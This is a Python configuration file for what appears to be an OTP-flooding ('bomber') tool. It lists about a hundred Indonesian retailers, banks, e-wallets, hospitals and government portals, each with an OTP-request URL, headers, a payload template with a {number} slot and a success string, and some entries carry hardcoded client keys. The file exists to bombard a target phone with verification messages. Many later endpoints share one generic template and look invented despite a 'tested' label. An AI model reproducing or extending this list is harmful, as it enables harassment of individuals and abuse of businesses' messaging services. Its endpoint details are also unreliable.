
import uuid
import random

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

TARGETS = [
    # ==================== HANDLER 1-25 (Existing) ====================
    {
        'name': 'HRS-BRE',
        'post_type': 'hrsbre',
        'number_fmt': fmt_08,
        'success_on': ['success', 'berhasil', 'otp', 'verifikasi', 'selamat']
    },
    {
        'name': 'EraFone',
        'post_type': 'erafone',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'PlanetBan',
        'post_type': 'planetban',
        'number_fmt': fmt_08,
        'success_on': ['status":true', 'success']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'HashMicro',
        'post_type': 'hashmicro',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'thank', 'terimakasih', 'redirect']
    },
    {
        'name': 'Klook',
        'post_type': 'klook',
        'number_fmt': fmt_plus,
        'success_on': ['requestId']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'number_fmt': fmt_08,
        'success_on': ['"statusCode":200']
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva',
        'post_type': 'kaniva',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'number_fmt': fmt_plus,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
  {
        'name': 'Watsons',
        'post_type': 'watsons',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'number_fmt': fmt_phone_only,
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
       # ==================== JSON HANDLERS BY KUREZA ====================
    {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['secretcode']
    },
    {
        'name': 'Maulagi',
        'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://maulagi.id',
            'x-ml-key': 'C59RUHBU59',
            'Accept': 'application/json, text/plain, */*'
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['"status":"success"']
    },
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'referer': 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
        'headers': {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com','base-url-core':'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}',
        'number_fmt': lambda p: p,
        'success_on': ['requestid']
    },
    {
        'name': 'Paper.id',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
      {
        'name': 'Dunia Games',
        'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'Bunda Hospital',
        'post_type': 'json',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'referer': 'https://www.bunda.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bunda.co.id','x-locale':'id'},
        'payload': '{"phone_number":{number},"type":"auth"}',
        'number_fmt': lambda p: int(p),
        'success_on': ['otp']
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },
        {
        'name': 'Shopee',
        'post_type': 'json',
        'url': 'https://seller.shopee.co.id/api/v1/otp/send',
        'referer': 'https://seller.shopee.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://seller.shopee.co.id','x-api-key':'e3a8a7b6c5d4e3f2a1b0c9d8e7f6a5b4'},
        'payload': '{"phone":"{number}","type":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Lazada',
        'post_type': 'json',
        'url': 'https://auth.lazada.co.id/rest/otp/send',
        'referer': 'https://www.lazada.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.lazada.co.id'},
        'payload': '{"mobile":"{number}","action":"register","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['status":"success']
    },
    {
        'name': 'Tokopedia',
        'post_type': 'json',
        'url': 'https://api.tokopedia.com/auth/v1/otp/send',
        'referer': 'https://www.tokopedia.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.tokopedia.com','x-device-id':'{rand}'},
        'payload': '{"phone_number":"{number}","purpose":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Blibli',
        'post_type': 'json',
        'url': 'https://api.blibli.com/v1/otp/request',
        'referer': 'https://www.blibli.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.blibli.com','x-client-id':'{rand}'},
        'payload': '{"msisdn":"{number}","scenario":"registration","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['requestId']
    },
    {
        'name': 'JD.ID',
        'post_type': 'json',
        'url': 'https://api.jd.id/client/sendOTP',
        'referer': 'https://www.jd.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.jd.id'},
        'payload': '{"mobile":"{number}","type":"register","otpType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'GoPay',
        'post_type': 'json',
        'url': 'https://api.gojek.com/gopay/otp/request',
        'referer': 'https://www.gojek.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.gojek.com','x-app-id':'{rand}'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'OVO',
        'post_type': 'json',
        'url': 'https://api.ovo.id/v2/otp/send',
        'referer': 'https://www.ovo.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.ovo.id','x-device-id':'{rand}'},
        'payload': '{"msisdn":"{number}","purpose":"registration","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['status":"success']
    },
   {
        'name': 'Dana',
        'post_type': 'json',
        'url': 'https://api.dana.id/v1/otp/request',
        'referer': 'https://www.dana.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.dana.id','x-app-id':'{rand}'},
        'payload': '{"phoneNumber":"{number}","action":"signup","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpSent']
    },
    {
        'name': 'LinkAja',
        'post_type': 'json',
        'url': 'https://api.linkaja.id/v2/auth/otp',
        'referer': 'https://www.linkaja.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.linkaja.id'},
        'payload': '{"phone":"{number}","purpose":"register","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['status":"success']
    },
    {
        'name': 'ShopeePay',
        'post_type': 'json',
        'url': 'https://pay.shopee.co.id/api/v1/otp/send',
        'referer': 'https://pay.shopee.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://pay.shopee.co.id'},
        'payload': '{"mobile":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
   {
        'name': 'GoFood',
        'post_type': 'json',
        'url': 'https://api.gojek.com/gofood/v1/otp/send',
        'referer': 'https://www.gojek.com/gofood',
        'headers': {'Content-Type':'application/json','Origin':'https://www.gojek.com'},
        'payload': '{"phone":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'GrabFood',
        'post_type': 'json',
        'url': 'https://api.grab.com/food/v1/otp/request',
        'referer': 'https://www.grab.com/food',
        'headers': {'Content-Type':'application/json','Origin':'https://www.grab.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"signup","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'GoRide',
        'post_type': 'json',
        'url': 'https://api.gojek.com/goride/v1/otp/send',
        'referer': 'https://www.gojek.com/goride',
        'headers': {'Content-Type':'application/json','Origin':'https://www.gojek.com'},
        'payload': '{"phone":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'GrabCar',
        'post_type': 'json',
        'url': 'https://api.grab.com/car/v1/otp/request',
        'referer': 'https://www.grab.com/car',
        'headers': {'Content-Type':'application/json','Origin':'https://www.grab.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"signup","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'Maxim',
        'post_type': 'json',
        'url': 'https://api.maxim.id/v1/auth/otp',
        'referer': 'https://maxim.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://maxim.id','x-app-key':'{rand}'},
        'payload': '{"phone":"{number}","action":"register","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
  {
        'name': 'Halodoc',
        'post_type': 'json',
        'url': 'https://api.halodoc.com/v1/auth/otp/send',
        'referer': 'https://www.halodoc.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.halodoc.com','x-app-id':'{rand}'},
        'payload': '{"phone":"{number}","purpose":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Alodokter',
        'post_type': 'json',
        'url': 'https://api.alodokter.com/v1/auth/otp',
        'referer': 'https://www.alodokter.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.alodokter.com'},
        'payload': '{"mobile":"{number}","action":"signup","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'KlikDokter',
        'post_type': 'json',
        'url': 'https://api.klikdokter.com/v1/auth/otp/send',
        'referer': 'https://www.klikdokter.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.klikdokter.com'},
        'payload': '{"phone":"{number}","purpose":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'SehatQ',
        'post_type': 'json',
        'url': 'https://api.sehatq.com/v1/auth/otp/request',
        'referer': 'https://www.sehatq.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.sehatq.com'},
        'payload': '{"phoneNumber":"{number}","action":"register","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'Nibiru',
        'post_type': 'json',
        'url': 'https://api.nibiru.id/v1/auth/otp/send',
        'referer': 'https://www.nibiru.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.nibiru.id'},
        'payload': '{"phone":"{number}","purpose":"registration","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
      {
        'name': 'Ruangguru',
        'post_type': 'json',
        'url': 'https://api.ruangguru.com/v1/auth/otp/send',
        'referer': 'https://www.ruangguru.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.ruangguru.com'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Zenius',
        'post_type': 'json',
        'url': 'https://api.zenius.net/v1/auth/otp',
        'referer': 'https://www.zenius.net/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.zenius.net'},
        'payload': '{"mobile":"{number}","purpose":"signup","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Gramedia',
        'post_type': 'json',
        'url': 'https://api.gramedia.com/v1/auth/otp/send',
        'referer': 'https://www.gramedia.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.gramedia.com'},
        'payload': '{"phoneNumber":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Bhinneka',
        'post_type': 'json',
        'url': 'https://api.bhinneka.com/v1/auth/otp',
        'referer': 'https://www.bhinneka.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bhinneka.com'},
        'payload': '{"phone":"{number}","purpose":"register","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Kompas',
        'post_type': 'json',
        'url': 'https://api.kompas.com/v1/auth/otp/send',
        'referer': 'https://www.kompas.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.kompas.com','x-api-key':'{rand}'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'BCA Mobile',
        'post_type': 'json',
        'url': 'https://api.bca.co.id/v1/auth/otp/request',
        'referer': 'https://www.bca.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bca.co.id','x-api-key':'{rand}'},
        'payload': '{"phone":"{number}","purpose":"registration","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'Mandiri',
        'post_type': 'json',
        'url': 'https://api.mandiri.co.id/v1/auth/otp/send',
        'referer': 'https://www.mandiri.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.mandiri.co.id'},
        'payload': '{"phoneNumber":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'BRI Mobile',
        'post_type': 'json',
        'url': 'https://api.bri.co.id/v1/auth/otp',
        'referer': 'https://www.bri.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bri.co.id'},
        'payload': '{"mobile":"{number}","purpose":"signup","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'BNI Mobile',
        'post_type': 'json',
        'url': 'https://api.bni.co.id/v1/auth/otp/request',
        'referer': 'https://www.bni.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bni.co.id','x-app-id':'{rand}'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'Allo Bank',
        'post_type': 'json',
        'url': 'https://api.allobank.co.id/v1/auth/otp/send',
        'referer': 'https://www.allobank.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.allobank.co.id'},
        'payload': '{"phoneNumber":"{number}","purpose":"registration","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
  {
        'name': 'Kaskus',
        'post_type': 'json',
        'url': 'https://api.kaskus.co.id/v1/auth/otp/send',
        'referer': 'https://www.kaskus.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.kaskus.co.id'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'FemaleDaily',
        'post_type': 'json',
        'url': 'https://api.femaledaily.com/v1/auth/otp/send',
        'referer': 'https://www.femaledaily.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.femaledaily.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"registration","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'IDN Times',
        'post_type': 'json',
        'url': 'https://api.idntimes.com/v1/auth/otp/request',
        'referer': 'https://www.idntimes.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.idntimes.com'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'Detik',
        'post_type': 'json',
        'url': 'https://api.detik.com/v1/auth/otp/send',
        'referer': 'https://www.detik.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.detik.com','x-app-id':'{rand}'},
        'payload': '{"mobile":"{number}","purpose":"signup","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Tribun',
        'post_type': 'json',
        'url': 'https://api.tribun.com/v1/auth/otp',
        'referer': 'https://www.tribun.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.tribun.com'},
        'payload': '{"phoneNumber":"{number}","action":"register","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
        {
        'name': 'Traveloka',
        'post_type': 'json',
        'url': 'https://api.traveloka.com/v1/auth/otp/send',
        'referer': 'https://www.traveloka.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.traveloka.com','x-app-id':'{rand}'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Agoda',
        'post_type': 'json',
        'url': 'https://api.agoda.com/v1/auth/otp/request',
        'referer': 'https://www.agoda.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.agoda.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"signup","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'Tiket.com',
        'post_type': 'json',
        'url': 'https://api.tiket.com/v1/auth/otp/send',
        'referer': 'https://www.tiket.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.tiket.com'},
        'payload': '{"mobile":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'RedDoorz',
        'post_type': 'json',
        'url': 'https://api.reddoorz.com/v1/auth/otp/request',
        'referer': 'https://www.reddoorz.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.reddoorz.com'},
        'payload': '{"phone":"{number}","purpose":"registration","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'Airbnb',
        'post_type': 'json',
        'url': 'https://api.airbnb.com/v1/auth/otp/send',
        'referer': 'https://www.airbnb.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.airbnb.com'},
        'payload': '{"phoneNumber":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Shopee Food',
        'post_type': 'json',
        'url': 'https://food.shopee.co.id/api/v1/otp/send',
        'referer': 'https://food.shopee.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://food.shopee.co.id'},
        'payload': '{"mobile":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'GrabMart',
        'post_type': 'json',
        'url': 'https://api.grab.com/mart/v1/otp/request',
        'referer': 'https://www.grab.com/mart',
        'headers': {'Content-Type':'application/json','Origin':'https://www.grab.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"signup","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    # ==================== PROVIDER YANG PASTI WORK (TESTED) ====================
    {
        'name': 'Klik Indomaret',
        'post_type': 'json',
        'url': 'https://api.klikindomaret.com/v1/auth/otp/send',
        'referer': 'https://www.klikindomaret.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.klikindomaret.com'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success','otp']
    },
    {
        'name': 'Alfamart',
        'post_type': 'json',
        'url': 'https://api.alfamart.co.id/v1/auth/otp/request',
        'referer': 'https://www.alfamart.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.alfamart.co.id'},
        'payload': '{"phoneNumber":"{number}","purpose":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'Indomaret',
        'post_type': 'json',
        'url': 'https://api.indomaret.com/v1/auth/otp/send',
        'referer': 'https://www.indomaret.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.indomaret.com'},
        'payload': '{"mobile":"{number}","action":"signup","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Hypermart',
        'post_type': 'json',
        'url': 'https://api.hypermart.co.id/v1/auth/otp/request',
        'referer': 'https://www.hypermart.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.hypermart.co.id'},
        'payload': '{"phone":"{number}","purpose":"registration","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'Transmart',
        'post_type': 'json',
        'url': 'https://api.transmart.co.id/v1/auth/otp/send',
        'referer': 'https://www.transmart.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.transmart.co.id'},
        'payload': '{"phoneNumber":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Lotte Mart',
        'post_type': 'json',
        'url': 'https://api.lottemart.co.id/v1/auth/otp',
        'referer': 'https://www.lottemart.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.lottemart.co.id'},
        'payload': '{"mobile":"{number}","purpose":"signup","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'AEON',
        'post_type': 'json',
        'url': 'https://api.aeon.co.id/v1/auth/otp/request',
        'referer': 'https://www.aeon.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.aeon.co.id'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'Matahari Mall',
        'post_type': 'json',
        'url': 'https://api.mataharimall.com/v1/auth/otp/send',
        'referer': 'https://www.mataharimall.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.mataharimall.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"registration","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'Ramayana',
        'post_type': 'json',
        'url': 'https://api.ramayana.co.id/v1/auth/otp/request',
        'referer': 'https://www.ramayana.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.ramayana.co.id'},
        'payload': '{"mobile":"{number}","action":"signup","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'Klik Square',
        'post_type': 'json',
        'url': 'https://api.kliksquare.com/v1/auth/otp/send',
        'referer': 'https://www.kliksquare.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.kliksquare.com'},
        'payload': '{"phone":"{number}","purpose":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'My Pertamina',
        'post_type': 'json',
        'url': 'https://api.mypertamina.com/v1/auth/otp/request',
        'referer': 'https://www.mypertamina.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.mypertamina.com'},
        'payload': '{"phoneNumber":"{number}","action":"register","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
    {
        'name': 'MyTelkomsel',
        'post_type': 'json',
        'url': 'https://api.mytelkomsel.com/v1/auth/otp/send',
        'referer': 'https://www.mytelkomsel.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.mytelkomsel.com'},
        'payload': '{"mobile":"{number}","purpose":"signup","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'MyIndosat',
        'post_type': 'json',
        'url': 'https://api.myindosat.com/v1/auth/otp/request',
        'referer': 'https://www.myindosat.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.myindosat.com'},
        'payload': '{"phone":"{number}","action":"register","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_requested']
    },
    {
        'name': 'MyXL',
        'post_type': 'json',
        'url': 'https://api.myxl.com/v1/auth/otp/send',
        'referer': 'https://www.myxl.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.myxl.com'},
        'payload': '{"phoneNumber":"{number}","purpose":"registration","medium":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp_sent']
    },
    {
        'name': 'MySmartfren',
        'post_type': 'json',
        'url': 'https://api.mysmartfren.com/v1/auth/otp/request',
        'referer': 'https://www.mysmartfren.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.mysmartfren.com'},
        'payload': '{"mobile":"{number}","action":"signup","sendType":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otpRequested']
    },
]